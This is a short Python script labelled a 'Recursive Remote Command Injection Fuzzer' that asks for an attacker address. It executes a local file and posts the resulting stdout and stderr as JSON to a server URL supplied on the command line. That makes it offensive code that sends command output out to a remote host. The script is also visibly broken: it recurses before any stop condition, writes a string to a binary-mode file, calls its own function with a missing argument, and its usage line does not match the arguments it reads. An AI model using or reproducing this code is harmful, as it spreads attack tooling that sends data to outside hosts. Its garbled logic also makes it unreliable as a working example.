import os
import sys
import requests
import subprocess
import requests

print("Recursive Remote Command Injection Fuzzer, Usage: python3 rrcif.py attackeraddress")

def send_output_to_server(func, server_url):
    try:
        # Execute the function and redirect stdout and stderr to variables
        result = subprocess.run(func, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = result.stdout.decode()
        stderr = result.stderr.decode()

        # Send the output to the server
        data = {'stdout': stdout, 'stderr': stderr}
        requests.post(server_url, json=data)
    except Exception as e:
        print(f"An error occurred: {e}")
        
def recursive_file_call(file_path, server_url):
    # Base case: if the file doesn't exist, create it
    if not os.path.exists(file_path):
        with open(file_path, 'wb') as f:
            f.write('')

    # Open the file and check for 2 0's
    os.popen(file_path)
    send_output_to_server(recursive_file_call(file_path, server_url), server_url)
    with open(file_path, 'rb') as f:
        file_contents = f.read()
        if file_contents.count(b'0') == 2:
            # Delete the 2 0's and append a 1 to the file
            file_contents = file_contents.replace(b'0', b'', 2)
            file_contents += b'1'
            with open(file_path, 'wb') as f:
                f.write(file_contents)
                os.popen(file_path)
                send_output_to_server(recursive_file_call(file_path, server_url), server_url)
            return
        elif file_contents.count(b'1') >= 1:
            file_contents = file_contents.replace(b'1', b'00', 1)
            with open(file_path, 'wb') as f:
                f.write(file_contents)
                os.popen(file_path)
                send_output_to_server(recursive_file_call(file_path, server_url), server_url)
            return

    # Append a '0' to the file content and call the function recursively
    with open(file_path, 'ab') as f:
        f.write(b'0')
    recursive_file_call(file_path)

recursive_file_call(sys.argv[1], sys.argv[2])
